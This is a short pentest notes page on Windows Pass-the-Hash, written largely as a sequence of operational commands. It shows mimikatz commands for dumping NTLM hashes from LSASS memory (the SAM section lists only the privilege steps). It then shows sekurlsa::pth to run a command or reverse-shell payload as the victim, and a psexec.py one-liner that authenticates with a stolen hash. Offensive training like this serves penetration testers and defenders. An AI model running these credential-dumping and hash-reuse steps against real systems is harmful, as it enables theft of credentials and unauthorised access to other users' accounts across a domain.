---
title: Pass-The-Hash
---

:::danger Required Privileges: `Administrators`

:::

The **`NTLM`** **Challenge** sent during Authentication can be responded to just by knowing the **Password Hash.** This means we can Authenticate without requiring the plaintext password to be known. 

Instead of having to crack **NTLM Hashes**, if the Windows Domain is configured to use NTLM Authentication, we can **`Pass-the-Hash` (PtH)** and Authenticate Successfully.


<br/>

### SAM

:::info This method will only get Hashes from `Local Users` on the machine. `No Domain User's` hashes will be available.

:::


```batch
:: Extracting NTLM Hashes from Local SAM
privilege::debug
token::elevate
```

### LSASS

:::info This method will extract any NTLM Hashes for Local Users and any Domain User that has recently Logged onto the Machine.

:::

```batch
:: Extracting NTLM Hashes from LSASS Memory
privilege::debug
token::elevate
sekurlsa::msv 
```
<br/>

We can then use the **`Extracted Hashes`** to perform a **Pass-the-Hash** Attack by using **`mimikatz`** to Inject an Access Token for the Victim User on a **Reverse Shell or any other Command.**

```batch
:: Reverts the Previous Token
token::revert

:: Pass-the-Hash
sekurlsa::pth /user:USER /domain:TARGET /ntlm:HASH /run:"Command/PAYLOAD To Run"

:: Command Example
/run:"cmd.exe"
```

```batch
:: It is also Possible to use [PSExec]
:: [Domain] Can be Removed
psexec.py -hashes ":HASH" DOMAIN/USER@TARGET
```